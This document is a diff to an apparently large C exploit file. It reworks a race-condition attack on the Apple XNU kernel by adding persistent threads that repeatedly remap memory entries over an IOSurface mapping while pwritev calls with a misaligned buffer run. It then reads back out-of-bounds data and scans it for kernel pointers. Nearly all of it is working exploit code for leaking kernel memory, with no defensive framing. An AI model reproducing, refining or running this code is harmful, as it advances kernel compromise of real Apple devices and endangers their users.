@@ -17303,29 +17303,39 @@ static void r460_exploit(void) {
  */
 
 struct r470_shared {
-    _Atomic int race_sync;
-    _Atomic int stop;
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
     mach_vm_address_t target;
     mach_vm_size_t target_size;
-    mach_port_t remap_entry;
+    mach_port_t surf_entry;
+    volatile mach_port_t search_entry;
 };
 
-static void *r470_free_thread(void *arg) {
+static void *r470_osc_thread(void *arg) {
     struct r470_shared *s = (struct r470_shared *)arg;
     pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
     mach_port_t self = mach_task_self();
-    while (!atomic_load_explicit(&s->stop, __ATOMIC_SEQ_CST)) {
-        while (atomic_load_explicit(&s->race_sync, __ATOMIC_SEQ_CST) != 1) {
-            if (atomic_load_explicit(&s->stop, __ATOMIC_SEQ_CST)) return NULL;
-            __asm__ volatile("yield");
-        }
-        mach_vm_address_t t = s->target;
-        mach_vm_map(self, &t, s->target_size, 0,
+    mach_vm_address_t tgt = s->target;
+    mach_vm_size_t sz = s->target_size;
+    mach_port_t se = s->surf_entry;
+    while (!s->go) __asm__ volatile("yield");
+    while (!s->stop) {
+        mach_port_t ce = s->search_entry;
+        if (ce == MACH_PORT_NULL) { __asm__ volatile("yield"); continue; }
+        mach_vm_address_t t = tgt;
+        mach_vm_map(self, &t, sz, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-            s->remap_entry, 0, FALSE,
+            se, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
-        atomic_store_explicit(&s->race_sync, 0, __ATOMIC_SEQ_CST);
+        t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            ce, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&s->remap_count, 1);
     }
     return NULL;
 }
@@ -17459,45 +17469,44 @@ static void r470_exploit(void) {
     rlog("    Race win: errno=EINVAL after pwritev\n");
     fflush(stdout);
 
+    #define R470_OSC_THREADS 4
+
+    /* Start persistent oscillation threads */
     struct r470_shared shared;
     memset(&shared, 0, sizeof(shared));
     shared.target = (mach_vm_address_t)(uintptr_t)surf_base;
     shared.target_size = R470_SURF_SZ;
-    shared.remap_entry = MACH_PORT_NULL;
+    shared.surf_entry = surf_entry;
+    shared.search_entry = MACH_PORT_NULL;
 
-    pthread_t free_tid;
-    pthread_create(&free_tid, NULL, r470_free_thread, &shared);
+    pthread_t osc_tids[R470_OSC_THREADS];
+    for (int t = 0; t < R470_OSC_THREADS; t++)
+        pthread_create(&osc_tids[t], NULL, r470_osc_thread, &shared);
+    shared.go = 1;
+    __sync_synchronize();
 
     int total_races = 0, race_wins = 0, oob_reads = 0;
     uint8_t oob_buf[R470_PAGE_SZ];
     int found_kptr = 0;
+    mach_port_t prev_entry = MACH_PORT_NULL;
 
-    for (uint64_t sp = 0; sp < search_pages && !found_kptr; sp++) {
+    for (uint64_t sp = 0; sp < search_pages - 1 && !found_kptr; sp++) {
         mach_vm_address_t sp_addr = search_base + sp * R470_PAGE_SZ;
 
-        /* Create memory entry for this search page pair (2 pages) */
-        if (sp + 1 >= search_pages) break;
         memory_object_size_t sp_memsz = R470_SURF_SZ;
         mach_port_t sp_entry = MACH_PORT_NULL;
         kr = mach_make_memory_entry_64(mach_task_self(), &sp_memsz,
             sp_addr, VM_PROT_READ | VM_PROT_WRITE, &sp_entry, MACH_PORT_NULL);
         if (kr != KERN_SUCCESS || sp_memsz != R470_SURF_SZ) continue;
 
-        shared.remap_entry = sp_entry;
+        /* Swap search entry atomically — threads pick up new entry */
+        shared.search_entry = sp_entry;
+        __sync_synchronize();
+        if (prev_entry != MACH_PORT_NULL)
+            mach_port_deallocate(mach_task_self(), prev_entry);
+        prev_entry = sp_entry;
 
         for (int iter = 0; iter < R470_ITERS_PER_PAGE; iter++) {
-            /* Restore IOSurface mapping */
-            mach_vm_address_t t = (mach_vm_address_t)(uintptr_t)surf_base;
-            mach_vm_map(mach_task_self(), &t, R470_SURF_SZ, 0,
-                VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-                surf_entry, 0, FALSE,
-                VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
-                VM_INHERIT_NONE);
-
-            /* Signal free thread to do remap */
-            atomic_store_explicit(&shared.race_sync, 1, __ATOMIC_SEQ_CST);
-
-            /* pwritev with misaligned iov */
             struct iovec wv = {
                 (void *)((uintptr_t)surf_base + R470_IOV_OFFSET),
                 R470_IOV_LEN
@@ -17507,15 +17516,9 @@ static void r470_exploit(void) {
             int save_errno = errno;
             total_races++;
 
-            /* Wait for free thread to complete */
-            while (atomic_load_explicit(&shared.race_sync, __ATOMIC_SEQ_CST) != 0)
-                __asm__ volatile("yield");
-
             if (w == -1 && save_errno == EINVAL) {
                 race_wins++;
-                /* Read back file data to check for OOB content */
                 pread(fd, oob_buf, R470_PAGE_SZ, R470_IOV_OFFSET);
-                /* Check for kernel pointers in OOB region */
                 int kptrs = 0;
                 for (int j = 0x100; j < R470_IOV_LEN - 7; j += 8) {
                     uint64_t val = *(uint64_t *)(oob_buf + j);
@@ -17534,26 +17537,35 @@ static void r470_exploit(void) {
                     found_kptr = 1;
                     break;
                 }
-                if (race_wins <= 5 || race_wins % 100 == 0)
-                    rlog("    Race win #%d at sp=%llu (no kptrs yet)\n",
+                if (race_wins <= 10 || race_wins % 50 == 0)
+                    rlog("    Race win #%d at sp=%llu (no kptrs)\n",
                          race_wins, (unsigned long long)sp);
+            } else if (w != (ssize_t)R470_IOV_LEN && total_races <= 5) {
+                rlog("    pwritev=%zd errno=%d at sp=%llu\n",
+                     w, save_errno, (unsigned long long)sp);
             }
         }
 
-        mach_port_deallocate(mach_task_self(), sp_entry);
-
-        if ((sp + 1) % 1000 == 0)
+        if ((sp + 1) % 500 == 0)
             rlog("    ... sp=%llu/%llu  races=%d wins=%d oob=%d\n",
                  (unsigned long long)(sp + 1), (unsigned long long)search_pages,
                  total_races, race_wins, oob_reads);
     }
 
-    atomic_store_explicit(&shared.stop, 1, __ATOMIC_SEQ_CST);
-    atomic_store_explicit(&shared.race_sync, 1, __ATOMIC_SEQ_CST);
-    pthread_join(free_tid, NULL);
+    shared.stop = 1;
+    __sync_synchronize();
+    int total_osc = 0;
+    for (int t = 0; t < R470_OSC_THREADS; t++) {
+        pthread_join(osc_tids[t], NULL);
+    }
+    total_osc = shared.remap_count;
+    if (prev_entry != MACH_PORT_NULL)
+        mach_port_deallocate(mach_task_self(), prev_entry);
 
-    rlog("\n    TOTAL: races=%d wins=%d oob_kptr=%d\n",
-         total_races, race_wins, oob_reads);
+    rlog("\n    TOTAL: races=%d wins=%d oob_kptr=%d osc=%d\n",
+         total_races, race_wins, oob_reads, total_osc);
+
+    #undef R470_OSC_THREADS
 
     /* Cleanup */
     mach_vm_deallocate(mach_task_self(), search_base, R470_SEARCH_SZ);
